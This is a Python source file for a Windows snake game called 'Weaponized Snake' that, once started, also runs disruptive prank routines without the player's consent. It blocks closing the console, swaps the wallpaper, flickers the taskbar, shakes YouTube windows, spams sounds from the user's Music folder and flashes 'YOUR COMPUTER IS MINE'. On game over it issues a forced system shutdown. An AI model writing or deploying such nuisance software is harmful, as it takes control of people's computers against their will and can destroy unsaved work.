import ctypes
import tkinter as tk
import random, webbrowser, os, time, threading, glob, string
from ctypes import wintypes

# Optional winsound
try: import winsound
except: winsound = None

# ─── Config ────────────────────────────────────────────────────────────────────
WIDTH, HEIGHT           = 800, 600
GRID_SIZE               = 20
INITIAL_SPEED_MS        = 100
SPEED_INCREASE_INTERVAL = 15
SHUTDOWN_DELAY          = 35
SHUTDOWN_CMD            = f"shutdown /s /t {SHUTDOWN_DELAY}"
BASE_SHAKE_MAG          = 5
BREAK_URL               = "https://youtu.be/EZgePsBQMAM?si=qO0XZNgSRxMltZNA"

kernel32 = ctypes.windll.kernel32
user32   = ctypes.windll.user32

# ─── Disable console close (Alt+F4/X) ───────────────────────────────────────────
hwnd = kernel32.GetConsoleWindow()
if hwnd:
    hMenu = user32.GetSystemMenu(hwnd, False)
    if hMenu:
        user32.DeleteMenu(hMenu, 0xF060, 0x00000000)
        user32.DrawMenuBar(hwnd)

# ─── Helpers ───────────────────────────────────────────────────────────────────
def safe_system(cmd):
    try: os.system(cmd)
    except: pass

def change_wallpaper_loop(duration):
    end = time.time() + duration
    while time.time() < end:
        try:
            home = os.getenv("USERPROFILE","")
            pics = glob.glob(os.path.join(home,"Pictures","*.png"))
            if pics:
                user32.SystemParametersInfoW(20,0,random.choice(pics),3)
        except: pass
        time.sleep(1)

def taskbar_toggle_loop(duration):
    SW_HIDE, SW_SHOW = 0, 5
    try:
        tray = user32.FindWindowW("Shell_TrayWnd", None)
    except:
        tray = None
    hide = False
    end = time.time() + duration
    while time.time() < end and tray:
        try:
            user32.ShowWindow(tray, SW_HIDE if not hide else SW_SHOW)
        except: pass
        hide = not hide
        time.sleep(0.2)
    if tray:
        try: user32.ShowWindow(tray, SW_SHOW)
        except: pass

def enum_youtube_windows():
    hwnds = []
    u32 = ctypes.windll.user32
    @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    def cb(h, lParam):
        try:
            l = u32.GetWindowTextLengthW(h)
            if l>0:
                buf = ctypes.create_unicode_buffer(l+1)
                u32.GetWindowTextW(h, buf, l+1)
                if "YouTube" in buf.value:
                    hwnds.append(h)
        except: pass
        return True
    try: u32.EnumWindows(cb, 0)
    except: pass
    return hwnds

def shake_all_youtube_windows_loop(duration):
    rect = wintypes.RECT()
    end = time.time() + duration
    origs = {}
    u32 = ctypes.windll.user32
    while time.time() < end:
        for h in enum_youtube_windows():
            try:
                u32.GetWindowRect(h, ctypes.byref(rect))
                if h not in origs:
                    origs[h] = (rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top)
                ox,oy,w,hgt = origs[h]
                mag = BASE_SHAKE_MAG
                u32.MoveWindow(h,
                               ox+random.randint(-mag,mag),
                               oy+random.randint(-mag,mag),
                               w, hgt, True)
            except: pass
        time.sleep(0.5)
    for h,(ox,oy,w,hgt) in origs.items():
        try: u32.MoveWindow(h, ox,oy,w,hgt,True)
        except: pass

def audio_spam_loop(duration):
    end = time.time() + duration
    home = os.getenv("USERPROFILE","")
    wavs = glob.glob(os.path.join(home,"Music","*.wav"))
    while time.time() < end:
        if wavs and winsound:
            winsound.PlaySound(random.choice(wavs),
                               winsound.SND_FILENAME|winsound.SND_ASYNC)
        elif winsound:
            winsound.Beep(random.randint(300,2000),300)
        time.sleep(0.5)

# ─── Snake Game ────────────────────────────────────────────────────────────────
class SnakeGame:
    def __init__(self):
        # Basic window
        self.root = tk.Tk()
        self.root.title("Weaponized Snake")
        self.root.geometry(f"{WIDTH}x{HEIGHT}")
        self.root.update_idletasks()

        # Store origin for shake
        self.orig_x = self.root.winfo_x()
        self.orig_y = self.root.winfo_y()

        # Canvas + hide real cursor + overlay
        self.canvas = tk.Canvas(self.root, width=WIDTH, height=HEIGHT, bg="black",
                                highlightthickness=0)
        self.canvas.pack()
        self.root.config(cursor="none")
        self.cursor_oval = self.canvas.create_oval(-9999,-9999,-9999,-9999,
                                                   outline="yellow", width=3)
        self.canvas.bind("<Motion>", self.on_mouse_move)

        # Title flash
        self.flash_title()

        # Snake state
        mx, my = (WIDTH//2)//GRID_SIZE*GRID_SIZE, (HEIGHT//2)//GRID_SIZE*GRID_SIZE
        self.snake = [(mx - i*GRID_SIZE, my) for i in range(5)]
        self.direction = self.next_dir = "Right"
        self.score = 0

        # Apple
        self.apple_id = None
        self.place_apple()
        self.score_text = self.canvas.create_text(60,20, fill="white",
                                                  text="Score: 0",
                                                  font=("Arial",16))

        # Controls
        self.moving = {"Up":False, "Down":False, "Left":False, "Right":False}
        self.invert = False

        # Game timing
        self.speed = INITIAL_SPEED_MS
        self.last_speedup = time.time()
        self.running = True

        for dir in ("Up","Down","Left","Right"):
            self.root.bind(f"<KeyPress-{dir}>",   self.on_key_press)
            self.root.bind(f"<KeyRelease-{dir}>", self.on_key_release)

        # **Start ALL pranks immediately** and let them run for SHUTDOWN_DELAY
        threading.Thread(target=change_wallpaper_loop, args=(SHUTDOWN_DELAY,), daemon=True).start()
        threading.Thread(target=taskbar_toggle_loop, args=(SHUTDOWN_DELAY,), daemon=True).start()
        threading.Thread(target=shake_all_youtube_windows_loop, args=(SHUTDOWN_DELAY,), daemon=True).start()
        threading.Thread(target=audio_spam_loop, args=(SHUTDOWN_DELAY,), daemon=True).start()

        # Game loop
        self.root.after(self.speed, self.update)
        self.root.mainloop()

    def on_mouse_move(self, e):
        r = GRID_SIZE*20
        self.canvas.coords(self.cursor_oval,
                           e.x-r, e.y-r, e.x+r, e.y+r)

    def flash_title(self):
        self.root.title("YOUR COMPUTER IS MINE")
        self.root.after(500, lambda: self.root.title("Weaponized Snake"))
        self.root.after(random.randint(5000,15000), self.flash_title)

    def place_apple(self):
        if self.apple_id: self.canvas.delete(self.apple_id)
        while True:
            x = random.randint(0,(WIDTH-GRID_SIZE)//GRID_SIZE)*GRID_SIZE
            y = random.randint(0,(HEIGHT-GRID_SIZE)//GRID_SIZE)*GRID_SIZE
            if (x,y) not in self.snake:
                self.apple_id = self.canvas.create_rectangle(
                    x,y,x+GRID_SIZE,y+GRID_SIZE, fill="red")
                self.apple_pos = (x,y)
                return

    def on_key_press(self, e):
        k = e.keysym
        if self.invert and k in self.moving:
            inv = {"Up":"Down","Down":"Up","Left":"Right","Right":"Left"}
            k = inv[k]
        if k in self.moving: self.moving[k] = True

    def on_key_release(self, e):
        k = e.keysym
        if self.invert and k in self.moving:
            inv = {"Up":"Down","Down":"Up","Left":"Right","Right":"Left"}
            k = inv[k]
        if k in self.moving: self.moving[k] = False

    def flash_screen(self):
        f = self.canvas.create_rectangle(0,0,WIDTH,HEIGHT, fill="white", outline="")
        self.root.after(100, lambda: self.canvas.delete(f))

    def shake_window(self):
        mag = BASE_SHAKE_MAG
        nx = self.orig_x + random.randint(-mag,mag)
        ny = self.orig_y + random.randint(-mag,mag)
        try:
            user32.MoveWindow(self.root.winfo_id(), nx, ny, WIDTH, HEIGHT, True)
        except: pass

    def update(self):
        if not self.running:
            return

        # occasional in-game flash
        if random.random() < 0.02:
            self.flash_screen()

        # speed up
        now = time.time()
        if now - self.last_speedup > SPEED_INCREASE_INTERVAL:
            self.speed = max(20, self.speed - 10)
            self.last_speedup = now

        # shake game window
        self.shake_window()

        # move snake head
        x,y = self.snake[0]
        dx = GRID_SIZE * (1 if self.moving["Right"] else -1 if self.moving["Left"] else 0)
        dy = GRID_SIZE * (1 if self.moving["Down"] else -1 if self.moving["Up"] else 0)
        if dx==dy==0:
            dirs={"Up":(0,-GRID_SIZE),"Down":(0,GRID_SIZE),
                  "Left":(-GRID_SIZE,0),"Right":(GRID_SIZE,0)}
            dx,dy = dirs[self.direction]
        self.direction = { (0,-GRID_SIZE):"Up",
                           (0,GRID_SIZE):"Down",
                           (-GRID_SIZE,0):"Left",
                           (GRID_SIZE,0):"Right"}[(dx,dy)]

        new_head = (x+dx, y+dy)
        if (new_head in self.snake
            or not (0<=new_head[0]<WIDTH and 0<=new_head[1]<HEIGHT)):
            return self.end_game()

        self.snake.insert(0, new_head)
        if new_head == self.apple_pos:
            self.score += 1
            self.canvas.itemconfig(self.score_text, text=f"Score: {self.score}")
            if winsound: winsound.Beep(1000,100)
            self.place_apple()
        else:
            tail = self.snake.pop()
            self.canvas.create_rectangle(
                tail[0],tail[1],
                tail[0]+GRID_SIZE,tail[1]+GRID_SIZE,
                fill="black", outline="")

        self.canvas.create_rectangle(
            new_head[0],new_head[1],
            new_head[0]+GRID_SIZE,new_head[1]+GRID_SIZE,
            fill="green", outline="")

        self.root.after(self.speed, self.update)

    def end_game(self):
        self.running = False
        # show break link
        self.canvas.create_text(
            WIDTH//2, HEIGHT//2,
            text="GAME OVER\nClick for a break!",
            fill="yellow", font=("Arial",24),
            tags="break", justify="center")
        self.canvas.tag_bind("break", "<Button-1>",
                              lambda e: webbrowser.open(BREAK_URL))
        # already-running pranks will continue until shutdown
        safe_system(SHUTDOWN_CMD)

if __name__ == "__main__":
    SnakeGame()
